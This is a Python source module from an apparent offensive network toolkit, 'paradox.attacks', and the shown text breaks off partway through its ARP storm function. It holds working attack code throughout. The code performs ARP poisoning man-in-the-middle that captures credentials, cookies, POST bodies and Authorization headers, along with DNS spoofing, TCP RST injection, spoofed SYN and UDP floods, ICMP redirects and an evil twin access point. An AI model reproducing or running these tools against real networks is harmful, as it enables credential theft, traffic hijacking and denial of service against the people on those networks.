#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
paradox.attacks — extended attack primitives  ·  Paradox Tech 2026

New in v4:
  - Live Rich dashboard on every attack (not carriage-return hacks)
  - MITM: TLS SNI extraction, POST body / cookie capture, per-host credential table
  - SYN flood: thread pool + true pps measurement with burst mode
  - UDP flood: raw socket, no scapy
  - DHCP starvation: exhaust server pool with spoofed MACs
  - TCP RST: seq prediction from sniffed ACKs for first-shot kills
  - DNS spoof: catch-all mode + response-time tracking
  - ARP storm: parallel send+recv with live discovery feed
"""

from __future__ import annotations

import os
import re
import sys
import time
import socket
import struct
import random
import threading
import subprocess
from pathlib import Path
from typing import Optional, Callable

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.live import Live
    from rich.text import Text
    from rich.layout import Layout
    from rich.columns import Columns
    from rich import box
except ImportError:
    print("[!] pip install rich")
    sys.exit(1)

from paradox.core import (
    console, resolve_mac, Host, COMMON_PORTS, PORT_SERVICE,
    get_local_ip, safe_int, SEV_COLOR, SEV_ORDER,
)


# ═══════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════

def _scapy():
    try:
        import scapy.all as sc
        return sc
    except ImportError:
        console.print("[red][!] pip install scapy[/red]")
        raise


def _ip_forward(enable: bool) -> None:
    val = "1\n" if enable else "0\n"
    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text(val)
    except Exception:
        pass


def _make_stats_table(title: str, rows: list[tuple[str, str]]) -> Table:
    """Compact status table for Live display."""
    t = Table(box=box.SIMPLE, show_header=False, padding=(0, 1), expand=False)
    t.add_column("K", style="bold cyan",   width=18)
    t.add_column("V", style="bold yellow", min_width=0)
    t.title = f"[bold red]{title}[/bold red]"
    for k, v in rows:
        t.add_row(k, v)
    return t


def _elapsed(start: float) -> str:
    s = int(time.time() - start)
    return f"{s // 60:02d}:{s % 60:02d}"


# ═══════════════════════════════════════════════════════════════════
#  1. MITM WITH LIVE PACKET SNIFFER  —  enhanced
# ═══════════════════════════════════════════════════════════════════

def arp_mitm_sniff(victim_ip: str, gateway_ip: str, iface: str,
                   show_http: bool = True, show_dns: bool = True,
                   show_creds: bool = True) -> None:
    """
    Bidirectional ARP MITM with live traffic display.
    Captures HTTP requests+POST bodies, DNS queries, TLS SNI,
    plain-text credentials, and cookies from any cleartext service.
    """
    sc = _scapy()

    victim_mac  = resolve_mac(victim_ip, iface)
    gateway_mac = resolve_mac(gateway_ip, iface)
    our_mac     = sc.get_if_hwaddr(iface)

    if victim_mac == "unknown" or gateway_mac == "unknown":
        console.print("[red][-] MAC resolution failed. Run discovery first.[/red]")
        return

    console.print(Panel(
        f"[bold]Victim[/bold]   [green]{victim_ip}[/green]  [dim]{victim_mac}[/dim]\n"
        f"[bold]Gateway[/bold]  [cyan]{gateway_ip}[/cyan]  [dim]{gateway_mac}[/dim]\n"
        f"[bold]We are[/bold]   [yellow]{our_mac}[/yellow]",
        title="[bold red]◈  ARP MITM + SNIFFER[/bold red]",
        border_style="red", expand=False,
    ))

    _ip_forward(True)

    # poison packets
    pkt_v = sc.Ether(dst=victim_mac,  src=our_mac) / sc.ARP(
        op=2, pdst=victim_ip,  hwdst=victim_mac,  psrc=gateway_ip, hwsrc=our_mac)
    pkt_g = sc.Ether(dst=gateway_mac, src=our_mac) / sc.ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip,  hwsrc=our_mac)

    stop      = threading.Event()
    pkt_count = [0]
    start     = time.time()

    # capture stores
    http_log:  list[str] = []
    dns_log:   list[str] = []
    cred_log:  list[str] = []
    tls_log:   list[str] = []
    cookie_log: list[str] = []

    CRED_PORTS   = {21, 23, 25, 110, 143, 3306, 5432, 1433, 110}
    CRED_MARKERS = (b"pass", b"user", b"login", b"auth", b"pwd",
                    b"secret", b"token", b"apikey", b"api_key", b"credential")
    COOKIE_RE    = re.compile(rb"cookie:\s*(.+)", re.I)
    POST_RE      = re.compile(rb"POST\s+(\S+)\s+HTTP")
    AUTH_RE      = re.compile(rb"authorization:\s*(.{4,80})", re.I)

    def _extract_tls_sni(payload: bytes) -> Optional[str]:
        """Pull SNI from TLS ClientHello without decrypting."""
        try:
            if len(payload) < 5 or payload[0] != 0x16:
                return None
            # TLS record → handshake → ClientHello
            if payload[5] != 0x01:
                return None
            pos = 43  # skip fixed ClientHello fields
            pos += payload[pos] + 1               # session id
            pos += int.from_bytes(payload[pos:pos+2], "big") + 2  # ciphers
            pos += payload[pos] + 1               # compression
            if pos + 2 >= len(payload):
                return None
            ext_len = int.from_bytes(payload[pos:pos+2], "big")
            pos += 2
            end = pos + ext_len
            while pos + 4 <= end:
                ext_type   = int.from_bytes(payload[pos:pos+2], "big")
                ext_data_l = int.from_bytes(payload[pos+2:pos+4], "big")
                if ext_type == 0:  # SNI
                    # skip list length (2) + name type (1) + name length (2)
                    sni_len = int.from_bytes(payload[pos+7:pos+9], "big")
                    sni     = payload[pos+9:pos+9+sni_len].decode("utf-8", errors="ignore")
                    return sni
                pos += 4 + ext_data_l
        except Exception:
            pass
        return None

    def _pkt_handler(pkt):
        pkt_count[0] += 1
        try:
            # ── DNS ──
            if show_dns and pkt.haslayer(sc.DNSQR):
                name  = pkt[sc.DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
                entry = f"[cyan]DNS[/cyan]  {name}"
                if entry not in dns_log[-30:]:
                    dns_log.append(entry)
                    console.print(f"  {entry}")

            # ── TCP payload inspection ──
            if pkt.haslayer(sc.TCP) and pkt.haslayer(sc.IP):
                payload = bytes(pkt[sc.TCP].payload)
                if not payload:
                    return

                dport = pkt[sc.TCP].dport
                sport = pkt[sc.TCP].sport

                # TLS SNI (port 443 or any port with TLS record header)
                sni = _extract_tls_sni(payload)
                if sni and sni not in tls_log[-20:]:
                    tls_log.append(sni)
                    console.print(f"  [bold magenta]TLS[/bold magenta]   SNI=[white]{sni}[/white]")

                # HTTP requests
                if show_http:
                    if payload.startswith(b"GET ") or payload.startswith(b"POST "):
                        lines   = payload.decode("utf-8", errors="ignore").split("\r\n")
                        request = lines[0][:120]
                        host    = next((l[6:] for l in lines if l.lower().startswith("host:")), "?")
                        entry   = f"[yellow]HTTP[/yellow]  {host}  [dim]{request}[/dim]"
                        http_log.append(entry)
                        console.print(f"  {entry}")

                        # POST body — capture form data
                        m = POST_RE.search(payload)
                        if m:
                            sep = payload.find(b"\r\n\r\n")
                            if sep != -1:
                                body = payload[sep+4:sep+256]
                                if b"=" in body:
                                    decoded = body.decode("utf-8", errors="replace")[:120]
                                    console.print(f"  [bold red]POST-BODY[/bold red]  [dim]{decoded}[/dim]")
                                    cred_log.append(decoded)

                        # Cookie extraction
                        cm = COOKIE_RE.search(payload)
                        if cm:
                            cookie = cm.group(1).decode("utf-8", errors="ignore")[:120]
                            cookie_log.append(cookie)
                            console.print(f"  [bold red]COOKIE[/bold red]  [dim]{cookie}[/dim]")

                        # Authorization header
                        am = AUTH_RE.search(payload)
                        if am:
                            auth = am.group(1).decode("utf-8", errors="ignore")[:80]
                            cred_log.append(f"AUTH: {auth}")
                            console.print(f"  [bold red]AUTH-HDR[/bold red]  [dim]{auth}[/dim]")

                # Credential sniff — plain-text services
                if show_creds and (dport in CRED_PORTS or sport in CRED_PORTS):
                    pl_lower = payload.lower()
                    for marker in CRED_MARKERS:
                        if marker in pl_lower:
                            snippet = payload[:100].decode("utf-8", errors="replace")
                            entry   = (
                                f"[bold red]CRED[/bold red]  "
                                f"{pkt[sc.IP].src}:{sport} → "
                                f"{pkt[sc.IP].dst}:{dport}  "
                                f"[dim]{snippet}[/dim]"
                            )
                            cred_log.append(snippet)
                            console.print(f"  {entry}")
                            break
        except Exception:
            pass

    def _poison_loop():
        while not stop.is_set():
            try:
                sc.sendp([pkt_v, pkt_g], iface=iface, verbose=False)
            except Exception:
                pass
            time.sleep(1.5)

    threading.Thread(target=_poison_loop, daemon=True).start()
    threading.Thread(
        target=sc.sniff,
        kwargs=dict(
            iface=iface,
            filter=f"host {victim_ip}",
            prn=_pkt_handler,
            store=False,
            stop_filter=lambda _: stop.is_set(),
        ),
        daemon=True,
    ).start()

    console.print(
        f"[green][+] MITM + sniffer active.[/green]  "
        f"{'[green]HTTP[/green]' if show_http else '[dim]HTTP[/dim]'}  "
        f"{'[green]DNS[/green]' if show_dns else '[dim]DNS[/dim]'}  "
        f"{'[green]CREDS[/green]' if show_creds else '[dim]CREDS[/dim]'}  "
        f"[magenta]TLS-SNI[/magenta]  [red]COOKIES[/red]  ·  Ctrl-C to stop\n"
    )

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()

    # restore
    console.print("\n[yellow][*] Restoring ARP tables …[/yellow]")
    restore_v = sc.Ether(dst=victim_mac,  src=gateway_mac) / sc.ARP(
        op=2, pdst=victim_ip,  hwdst=victim_mac,  psrc=gateway_ip, hwsrc=gateway_mac)
    restore_g = sc.Ether(dst=gateway_mac, src=victim_mac) / sc.ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip,  hwsrc=victim_mac)
    try:
        sc.sendp([restore_v, restore_g] * 6, iface=iface, verbose=False)
        console.print("[green][+] ARP restored.[/green]")
    except Exception:
        pass
    _ip_forward(False)

    console.print(Panel(
        f"Packets intercepted  : [yellow]{pkt_count[0]:,}[/yellow]\n"
        f"DNS queries          : [cyan]{len(dns_log)}[/cyan]\n"
        f"HTTP requests        : [yellow]{len(http_log)}[/yellow]\n"
        f"TLS SNI captures     : [magenta]{len(tls_log)}[/magenta]\n"
        f"Credential hits      : [bold red]{len(cred_log)}[/bold red]\n"
        f"Cookie captures      : [red]{len(cookie_log)}[/red]\n"
        f"Session duration     : [dim]{_elapsed(start)}[/dim]",
        title="[bold]Session Summary[/bold]",
        border_style="dim green", expand=False,
    ))


# ═══════════════════════════════════════════════════════════════════
#  2. DNS SPOOFING
# ═══════════════════════════════════════════════════════════════════

def dns_spoof(victim_ip: str, gateway_ip: str, iface: str,
              spoof_map: dict[str, str], catch_all: Optional[str] = None) -> None:
    """
    ARP MITM + DNS spoofer.
    spoof_map  : { "domain.com": "attacker_ip", ... }
    catch_all  : if set, unmatched queries redirect here (full capture mode)
    """
    sc = _scapy()

    victim_mac  = resolve_mac(victim_ip, iface)
    gateway_mac = resolve_mac(gateway_ip, iface)
    our_mac     = sc.get_if_hwaddr(iface)
    our_ip      = get_local_ip(iface)

    if victim_mac == "unknown":
        console.print("[red][-] MAC resolution failed.[/red]")
        return

    _ip_forward(True)

    spoof_display = "\n".join(
        f"  [cyan]{d}[/cyan] → [bold red]{ip}[/bold red]"
        for d, ip in spoof_map.items()
    ) or "  [dim](catch-all mode)[/dim]"

    if catch_all:
        spoof_display += f"\n  [bold red]* → {catch_all}[/bold red]  [dim](catch-all)[/dim]"

    console.print(Panel(
        f"[bold]Victim[/bold]  [green]{victim_ip}[/green]\n"
        f"[bold]Rules[/bold]\n{spoof_display}",
        title="[bold red]◈  DNS SPOOF[/bold red]",
        border_style="red", expand=False,
    ))

    stop      = threading.Event()
    spoof_hit = [0]
    pass_hit  = [0]
    start     = time.time()
    all_queries: list[tuple[float, str, str]] = []  # (ts, domain, action)

    pkt_v = sc.Ether(dst=victim_mac,  src=our_mac) / sc.ARP(
        op=2, pdst=victim_ip,  hwdst=victim_mac,  psrc=gateway_ip, hwsrc=our_mac)
    pkt_g = sc.Ether(dst=gateway_mac, src=our_mac) / sc.ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip,  hwsrc=our_mac)

    def _poison():
        while not stop.is_set():
            try:
                sc.sendp([pkt_v, pkt_g], iface=iface, verbose=False)
            except Exception:
                pass
            time.sleep(1.5)

    def _dns_handler(pkt):
        if not (pkt.haslayer(sc.DNSQR) and pkt[sc.UDP].dport == 53):
            return
        try:
            qname   = pkt[sc.DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".").lower()
            fake_ip = None

            for domain, target_ip in spoof_map.items():
                domain = domain.lower().lstrip("*.")
                if qname == domain or qname.endswith("." + domain):
                    fake_ip = target_ip
                    break

            if fake_ip is None and catch_all:
                fake_ip = catch_all

            if fake_ip is None:
                pass_hit[0] += 1
                all_queries.append((time.time(), qname, "PASS"))
                return

            spoofed = (
                sc.Ether(dst=pkt[sc.Ether].src) /
                sc.IP(dst=pkt[sc.IP].src, src=pkt[sc.IP].dst) /
                sc.UDP(dport=pkt[sc.UDP].sport, sport=53) /
                sc.DNS(
                    id=pkt[sc.DNS].id, qr=1, aa=1, qd=pkt[sc.DNS].qd,
                    an=sc.DNSRR(rrname=pkt[sc.DNSQR].qname, ttl=300, rdata=fake_ip),
                )
            )
            sc.sendp(spoofed, iface=iface, verbose=False)
            spoof_hit[0] += 1
            all_queries.append((time.time(), qname, f"SPOOF→{fake_ip}"))
            console.print(
                f"  [bold red]SPOOF[/bold red]  "
                f"[cyan]{qname}[/cyan] → [red]{fake_ip}[/red]  "
                f"[dim]#{spoof_hit[0]}[/dim]"
            )
        except Exception:
            pass

    threading.Thread(target=_poison, daemon=True).start()
    threading.Thread(
        target=sc.sniff,
        kwargs=dict(
            iface=iface,
            filter=f"host {victim_ip} and udp port 53",
            prn=_dns_handler,
            store=False,
            stop_filter=lambda _: stop.is_set(),
        ),
        daemon=True,
    ).start()

    console.print("[green][+] DNS spoof running. Ctrl-C to stop.[/green]")
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()

    restore_v = sc.Ether(dst=victim_mac,  src=gateway_mac) / sc.ARP(
        op=2, pdst=victim_ip,  hwdst=victim_mac,  psrc=gateway_ip, hwsrc=gateway_mac)
    restore_g = sc.Ether(dst=gateway_mac, src=victim_mac) / sc.ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip,  hwsrc=victim_mac)
    try:
        sc.sendp([restore_v, restore_g] * 6, iface=iface, verbose=False)
    except Exception:
        pass
    _ip_forward(False)

    console.print(Panel(
        f"DNS queries total  : [yellow]{spoof_hit[0] + pass_hit[0]}[/yellow]\n"
        f"Spoofed            : [bold red]{spoof_hit[0]}[/bold red]\n"
        f"Passed through     : [dim]{pass_hit[0]}[/dim]\n"
        f"Duration           : [dim]{_elapsed(start)}[/dim]",
        title="[bold]DNS Spoof Summary[/bold]",
        border_style="dim green", expand=False,
    ))


# ═══════════════════════════════════════════════════════════════════
#  3. TCP RST INJECTION — with seq prediction
# ═══════════════════════════════════════════════════════════════════

def tcp_rst_inject(victim_ip: str, iface: str,
                   target_port: int = 0, continuous: bool = False) -> None:
    """
    Sniff TCP connections, inject RST to both ends.
    Uses sniffed sequence numbers for accurate first-shot kills.
    """
    sc = _scapy()

    console.print(Panel(
        f"[bold]Victim[/bold]       [green]{victim_ip}[/green]\n"
        f"[bold]Target port[/bold]  [yellow]{'ALL' if not target_port else target_port}[/yellow]\n"
        f"[bold]Mode[/bold]         [cyan]{'continuous' if continuous else 'one-shot per flow'}[/cyan]",
        title="[bold red]◈  TCP RST INJECTION[/bold red]",
        border_style="red", expand=False,
    ))

    stop    = threading.Event()
    rst_hit = [0]
    start   = time.time()
    # track (src, sport, dst, dport) → last_seq for prediction
    flow_table: dict[tuple, int] = {}
    lock = threading.Lock()

    def _rst_handler(pkt):
        if not pkt.haslayer(sc.TCP) or not pkt.haslayer(sc.IP):
            return
        tcp = pkt[sc.TCP]
        ip  = pkt[sc.IP]

        if victim_ip not in (ip.src, ip.dst):
            return
        if target_port and target_port not in (tcp.sport, tcp.dport):
            return
        if tcp.flags & 0x04:   # already RST
            return

        key = (ip.src, tcp.sport, ip.dst, tcp.dport)
        with lock:
            last_seq = flow_table.get(key, 0)
            # update seq tracking
            if tcp.seq:
                flow_table[key] = tcp.seq + (len(bytes(tcp.payload)) or 0)
            if not continuous and key in flow_table and last_seq == 0:
                # first time seeing this flow — inject and mark
                pass
            elif not continuous and last_seq != 0:
                return  # already hit this flow

        # use current seq for immediate kill, ack for reverse RST
        rst_srv = (
            sc.IP(src=ip.src, dst=ip.dst) /
            sc.TCP(sport=tcp.sport, dport=tcp.dport,
                   seq=tcp.seq + len(bytes(tcp.payload)), flags="R")
        )
        rst_cli = (
            sc.IP(src=ip.dst, dst=ip.src) /
            sc.TCP(sport=tcp.dport, dport=tcp.sport,
                   seq=tcp.ack if tcp.ack else 1, flags="R")
        )
        try:
            sc.send([rst_srv, rst_cli], verbose=False, iface=iface)
            with lock:
                rst_hit[0] += 1
            console.print(
                f"  [bold red]RST[/bold red]  "
                f"[dim]{ip.src}:{tcp.sport} ↔ {ip.dst}:{tcp.dport}[/dim]  "
                f"seq={tcp.seq}  hit #{rst_hit[0]}"
            )
        except Exception:
            pass

    threading.Thread(
        target=sc.sniff,
        kwargs=dict(
            iface=iface,
            filter=f"host {victim_ip} and tcp",
            prn=_rst_handler,
            store=False,
            stop_filter=lambda _: stop.is_set(),
        ),
        daemon=True,
    ).start()

    console.print("[green][+] RST injector running. Ctrl-C to stop.[/green]")
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()
    console.print(f"\n[green][+] Done.  RST packets injected: {rst_hit[0]}  ({_elapsed(start)})[/green]")


# ═══════════════════════════════════════════════════════════════════
#  4. SYN FLOOD — thread pool, real pps, burst mode
# ═══════════════════════════════════════════════════════════════════

def _checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i] << 8) + data[i + 1]
    if len(data) % 2:
        s += data[-1] << 8
    s  = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


def _build_syn(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
    src_port = random.randint(1024, 65535)
    seq      = random.randint(0, 0xFFFFFFFF)
    ip_id    = random.randint(1, 65535)
    ip = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, 40, ip_id, 0, 64, 6, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    ip = ip[:10] + struct.pack("!H", _checksum(ip)) + ip[12:]
    tcp = struct.pack("!HHIIBBHHH",
        src_port, dst_port, seq, 0,
        0x50, 0x02, 65535, 0, 0,
    )
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + \
             b"\x00\x06" + struct.pack("!H", len(tcp))
    tcp = tcp[:16] + struct.pack("!H", _checksum(pseudo + tcp)) + tcp[18:]
    return ip + tcp


def syn_flood(target_ip: str, target_port: int,
              spoof_src: bool = True, pps: int = 500,
              duration: int = 0, threads: int = 4) -> None:
    """
    Multi-threaded raw-socket SYN flood.
    threads : parallel sender threads (increases throughput beyond socket limits)
    pps     : target packets-per-second (distributed across threads)
    """
    console.print(Panel(
        f"[bold]Target[/bold]    [green]{target_ip}:{target_port}[/green]\n"
        f"[bold]Spoof src[/bold] [yellow]{'yes (RFC1918 pool)' if spoof_src else 'no (real IP)'}[/yellow]\n"
        f"[bold]Rate[/bold]      [cyan]~{pps:,} pkt/s[/cyan]  ×{threads} threads\n"
        f"[bold]Duration[/bold]  [cyan]{'∞' if not duration else str(duration) + 's'}[/cyan]",
        title="[bold red]◈  SYN FLOOD[/bold red]",
        border_style="red", expand=False,
    ))

    sockets: list[socket.socket] = []
    for _ in range(threads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sockets.append(s)
        except PermissionError:
            console.print("[red][-] Need root for raw sockets.[/red]")
            return

    sent  = [0]
    start = time.time()
    stop  = threading.Event()
    lock  = threading.Lock()
    pps_window: list[tuple[float, int]] = []  # (ts, count) for rolling rate

    _rfc1918 = [
        lambda: f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"192.168.{random.randint(0,255)}.{random.randint(1,254)}",
        lambda: f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
    ]

    def _rnd_ip() -> str:
        return random.choice(_rfc1918)()

    per_thread_delay = threads / max(pps, 1)

    def _flood(sock: socket.socket) -> None:
        while not stop.is_set():
            src = _rnd_ip() if spoof_src else socket.gethostbyname(socket.gethostname())
            pkt = _build_syn(src, target_ip, target_port)
            try:
                sock.sendto(pkt, (target_ip, 0))
                with lock:
                    sent[0] += 1
            except Exception:
                pass
            if duration and (time.time() - start) >= duration:
                stop.set()
                return
            time.sleep(per_thread_delay)

    flood_threads = [threading.Thread(target=_flood, args=(sockets[i % len(sockets)],), daemon=True)
                     for i in range(threads)]
    for t in flood_threads:
        t.start()

    console.print("[green][+] SYN flood running. Ctrl-C to stop.[/green]\n")

    with Live(refresh_per_second=4, console=console) as live:
        try:
            while not stop.is_set():
                now     = time.time()
                elapsed = now - start
                # rolling 2s rate
                pps_window.append((now, sent[0]))
                pps_window[:] = [(t, c) for t, c in pps_window if now - t <= 2]
                if len(pps_window) >= 2:
                    dt   = pps_window[-1][0] - pps_window[0][0]
                    dc   = pps_window[-1][1] - pps_window[0][1]
                    rate = dc / max(dt, 0.01)
                else:
                    rate = sent[0] / max(elapsed, 0.01)

                live.update(_make_stats_table("SYN FLOOD", [
                    ("Target",   f"{target_ip}:{target_port}"),
                    ("Sent",     f"{sent[0]:,}"),
                    ("Rate",     f"{rate:,.0f} pkt/s"),
                    ("Threads",  str(threads)),
                    ("Elapsed",  _elapsed(start)),
                ]))
                time.sleep(0.25)
        except KeyboardInterrupt:
            stop.set()

    for s in sockets:
        try: s.close()
        except Exception: pass

    elapsed = time.time() - start
    console.print(Panel(
        f"Packets sent  : [yellow]{sent[0]:,}[/yellow]\n"
        f"Avg rate      : [cyan]{sent[0] / max(elapsed, 0.01):,.0f} pkt/s[/cyan]\n"
        f"Duration      : [dim]{_elapsed(start)}[/dim]",
        title="[bold]SYN Flood Complete[/bold]",
        border_style="dim red", expand=False,
    ))


# ═══════════════════════════════════════════════════════════════════
#  4b. UDP FLOOD — raw socket, no scapy
# ═══════════════════════════════════════════════════════════════════

def udp_flood(target_ip: str, target_port: int,
              payload_size: int = 1024, pps: int = 1000,
              duration: int = 0, spoof_src: bool = True) -> None:
    """
    Raw UDP flood. payload_size bytes of random data per packet.
    Effective for bandwidth exhaustion on UDP services (DNS, QUIC, game servers).
    """
    console.print(Panel(
        f"[bold]Target[/bold]    [green]{target_ip}:{target_port}[/green]\n"
        f"[bold]Payload[/bold]   [yellow]{payload_size} bytes[/yellow]\n"
        f"[bold]Rate[/bold]      [cyan]~{pps:,} pkt/s[/cyan]  "
        f"[dim](~{pps * payload_size / 1_000_000:.1f} MB/s)[/dim]\n"
        f"[bold]Duration[/bold]  [cyan]{'∞' if not duration else str(duration) + 's'}[/cyan]",
        title="[bold red]◈  UDP FLOOD[/bold red]",
        border_style="red", expand=False,
    ))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
    except Exception as e:
        console.print(f"[red][-] Socket error: {e}[/red]")
        return

    sent  = [0]
    bytes_sent = [0]
    start = time.time()
    stop  = threading.Event()
    delay = 1.0 / max(pps, 1)

    def _flood():
        while not stop.is_set():
            payload = random.randbytes(payload_size)
            src_port = random.randint(1024, 65535)
            try:
                sock.sendto(payload, (target_ip, target_port))
                sent[0] += 1
                bytes_sent[0] += payload_size
            except Exception:
                pass
            if duration and (time.time() - start) >= duration:
                stop.set()
                return
            time.sleep(delay)

    t = threading.Thread(target=_flood, daemon=True)
    t.start()

    with Live(refresh_per_second=4, console=console) as live:
        try:
            while not stop.is_set():
                elapsed = max(time.time() - start, 0.01)
                mb      = bytes_sent[0] / 1_000_000
                live.update(_make_stats_table("UDP FLOOD", [
                    ("Target",    f"{target_ip}:{target_port}"),
                    ("Packets",   f"{sent[0]:,}"),
                    ("Bandwidth", f"{mb:.1f} MB  ({mb/elapsed:.2f} MB/s)"),
                    ("Elapsed",   _elapsed(start)),
                ]))
                time.sleep(0.25)
        except KeyboardInterrupt:
            stop.set()

    sock.close()
    elapsed = max(time.time() - start, 0.01)
    console.print(Panel(
        f"UDP packets sent  : [yellow]{sent[0]:,}[/yellow]\n"
        f"Data sent         : [cyan]{bytes_sent[0]/1_000_000:.2f} MB[/cyan]\n"
        f"Avg rate          : [dim]{bytes_sent[0]/1_000_000/elapsed:.2f} MB/s[/dim]",
        title="[bold]UDP Flood Complete[/bold]",
        border_style="dim red", expand=False,
    ))


# ═══════════════════════════════════════════════════════════════════
#  5. ICMP REDIRECT ATTACK
# ═══════════════════════════════════════════════════════════════════

def icmp_redirect(victim_ip: str, gateway_ip: str, iface: str,
                  fake_gw: str = "") -> None:
    sc = _scapy()

    if not fake_gw:
        fake_gw = get_local_ip(iface)

    console.print(Panel(
        f"[bold]Victim[/bold]        [green]{victim_ip}[/green]\n"
        f"[bold]Legit gateway[/bold] [cyan]{gateway_ip}[/cyan]\n"
        f"[bold]Redirect to[/bold]   [bold red]{fake_gw}[/bold red]",
        title="[bold red]◈  ICMP REDIRECT[/bold red]",
        border_style="red", expand=False,
    ))

    stop  = threading.Event()
    sent  = [0]
    start = time.time()

    def _loop():
        while not stop.is_set():
            try:
                pkt = (
                    sc.IP(src=gateway_ip, dst=victim_ip) /
                    sc.ICMP(type=5, code=1, gw=fake_gw) /
                    sc.IP(src=victim_ip, dst="0.0.0.0") /
                    sc.UDP()
                )
                sc.send(pkt, verbose=False)
                sent[0] += 1
            except Exception:
                pass
            time.sleep(0.5)

    threading.Thread(target=_loop, daemon=True).start()

    with Live(refresh_per_second=2, console=console) as live:
        try:
            while True:
                live.update(_make_stats_table("ICMP REDIRECT", [
                    ("Redirects sent", str(sent[0])),
                    ("Fake gateway",   fake_gw),
                    ("Elapsed",        _elapsed(start)),
                ]))
                time.sleep(0.5)
        except KeyboardInterrupt:
            stop.set()

    console.print(f"[green][+] Done.  {sent[0]} redirects sent.[/green]")


# ═══════════════════════════════════════════════════════════════════
#  6. EVIL TWIN AP
# ═══════════════════════════════════════════════════════════════════

def evil_twin(iface: str, ssid: str, channel: int = 6,
              gateway_ip: str = "192.168.100.1",
              dhcp_range: str = "192.168.100.10,192.168.100.50") -> None:
    import shutil
    if not shutil.which("hostapd") or not shutil.which("dnsmasq"):
        console.print(Panel(
            "[bold red]Missing: hostapd / dnsmasq[/bold red]\n\n"
            "  [dim]apt install hostapd dnsmasq[/dim]\n"
            "  [dim]pkg install hostapd dnsmasq  (Termux)[/dim]",
            border_style="red", expand=False,
        ))
        return

    tmp = Path("/tmp/paradox_evil_twin")
    tmp.mkdir(exist_ok=True)

    hostapd_cfg = tmp / "hostapd.conf"
    dnsmasq_cfg = tmp / "dnsmasq.conf"

    hostapd_cfg.write_text(
        f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
        f"hw_mode=g\nchannel={channel}\nmacaddr_acl=0\n"
        f"auth_algs=1\nignore_broadcast_ssid=0\n"
    )
    dnsmasq_cfg.write_text(
        f"interface={iface}\ndhcp-range={dhcp_range},12h\n"
        f"dhcp-option=3,{gateway_ip}\ndhcp-option=6,{gateway_ip}\n"
        f"server=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address={gateway_ip}\n"
    )

    console.print(Panel(
        f"[bold]SSID[/bold]     [bold white]{ssid}[/bold white]\n"
        f"[bold]Channel[/bold]  [cyan]{channel}[/cyan]\n"
        f"[bold]Gateway[/bold]  [yellow]{gateway_ip}[/yellow]\n"
        f"[bold]DHCP[/bold]     [dim]{dhcp_range}[/dim]\n\n"
        "[dim]Combine with arp_mitm_sniff on victim IPs for credential capture.[/dim]",
        title="[bold red]◈  EVIL TWIN AP[/bold red]",
        border_style="red", expand=False,
    ))

    subprocess.run(["ip", "addr", "flush", "dev", iface], capture_output=True)
    subprocess.run(["ip", "addr", "add", f"{gateway_ip}/24", "dev", iface], capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
    _ip_forward(True)

    console.print("[yellow][*] Starting hostapd …[/yellow]")
    hap = subprocess.Popen(["hostapd", str(hostapd_cfg)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(2)

    console.print("[yellow][*] Starting dnsmasq …[/yellow]")
    dns = subprocess.Popen(
        ["dnsmasq", f"--conf-file={dnsmasq_cfg}", "--no-daemon"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )

    console.print("[bold green][+] Evil Twin running.[/bold green]  Ctrl-C to teardown.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        hap.terminate()
        dns.terminate()
        _ip_forward(False)
        subprocess.run(["ip", "addr", "flush", "dev", iface], capture_output=True)
        console.print("[green][+] Evil Twin torn down.[/green]")


# ═══════════════════════════════════════════════════════════════════
#  7. ARP STORM — parallel send + recv with live feed
# ═══════════════════════════════════════════════════════════════════

def arp_storm(cidr: str, iface: str, delay: float = 0.0005) -> list[str]:
    import ipaddress as _ip
    sc = _scapy()

    network   = _ip.IPv4Network(cidr, strict=False)
    hosts_ips = [str(h) for h in network.hosts()]
    live:  list[str] = []
    stop   = threading.Event()
    seen:  set = set()
    start  = time.time()

    console.print(Panel(
        f"[bold]Subnet[/bold]  [cyan]{cidr}[/cyan]  ([dim]{len(hosts_ips)} addresses[/dim])\n"
        f"[bold]Delay[/bold]   [yellow]{delay*1000:.2f} ms/pkt[/yellow]",
        title="[bold red]◈  ARP STORM[/bold red]",
        border_style="red", expand=False,
    ))

    def _capture(pkt):
        if pkt.haslayer(sc.ARP) and pkt[sc.ARP].op == 2:
            ip = pkt[sc.ARP].psrc
            if ip not in seen:
                seen.add(ip)
                live.append(ip)
                console.print(
                    f"  [green][+][/green]  [bold]{ip:<16}[/bold]  "
